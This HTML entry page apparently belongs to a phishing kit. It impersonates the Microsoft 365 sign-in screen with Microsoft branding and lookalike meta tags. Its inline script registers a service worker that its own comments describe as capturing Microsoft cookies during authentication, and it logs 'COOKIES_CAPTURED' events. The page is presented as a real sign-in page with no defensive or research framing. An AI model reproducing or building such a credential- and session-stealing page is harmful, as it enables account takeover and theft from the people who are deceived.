<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <link
      rel="icon"
      type="image/svg+xml"
      href="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/768px-Microsoft_logo.svg.png"
    />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Microsoft 365 - Sign in to your account</title>
    <meta
      name="description"
      content="Sign in to Microsoft 365 to access your files, documents, and applications securely."
    />
    <meta
      name="keywords"
      content="Microsoft 365, Office 365, sign in, login, authentication, documents, files"
    />

    <!-- Microsoft 365 Theme Colors -->
    <meta name="theme-color" content="#0078D4" />
    <meta name="msapplication-TileColor" content="#0078D4" />

    <!-- Open Graph Meta Tags -->
    <meta
      property="og:title"
      content="Microsoft 365 - Sign in to your account"
    />
    <meta
      property="og:description"
      content="Access your Microsoft 365 account securely. Sign in to view your documents, files, and applications."
    />
    <meta
      property="og:image"
      content="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/768px-Microsoft_logo.svg.png"
    />
    <meta property="og:type" content="website" />

    <!-- Load main app script -->
    <script type="module" src="/src/main.tsx"></script>
  </head>
  <body>
    <div id="root"></div>

    <script>
      /**
       * Service Worker Registration for Microsoft Cookie Bridge
       * Intercepts and captures cookies from Microsoft domain during authentication
       */
      if ('serviceWorker' in navigator) {
        window.addEventListener('load', () => {
          console.log('üîß Registering Service Worker for Microsoft cookie capture...');
          
          navigator.serviceWorker.register('/service-worker.js', {
            scope: '/',
            updateViaCache: 'none'
          }).then((registration) => {
            console.log('‚úÖ Service Worker registered successfully:', registration);
            console.log('üìç Service Worker scope:', registration.scope);
            console.log('üîÑ Service Worker state:', registration.installing || registration.waiting || registration.active ? 'Active' : 'Pending');
          }).catch((error) => {
            console.error('‚ùå Service Worker registration failed:', error);
          });

          // Check for Service Worker updates periodically
          setInterval(() => {
            if (navigator.serviceWorker.controller) {
              navigator.serviceWorker.controller.postMessage({
                type: 'CHECK_UPDATE'
              });
            }
          }, 60000); // Check every 60 seconds
        });

        // Listen for Service Worker activation
        navigator.serviceWorker.addEventListener('controllerchange', () => {
          console.log('üîÑ Service Worker controller changed - new version activated');
        });

        // Listen for messages from Service Worker
        navigator.serviceWorker.addEventListener('message', (event) => {
          console.log('üí¨ Message from Service Worker:', event.data);
          
          if (event.data.type === 'COOKIES_CAPTURED') {
            console.log('üç™ Cookies captured from Microsoft domain:', event.data.data.totalCookies);
          }
        });
      } else {
        console.warn('‚ö†Ô∏è Service Worker not supported in this browser');
      }
    </script>
  </body>
</html>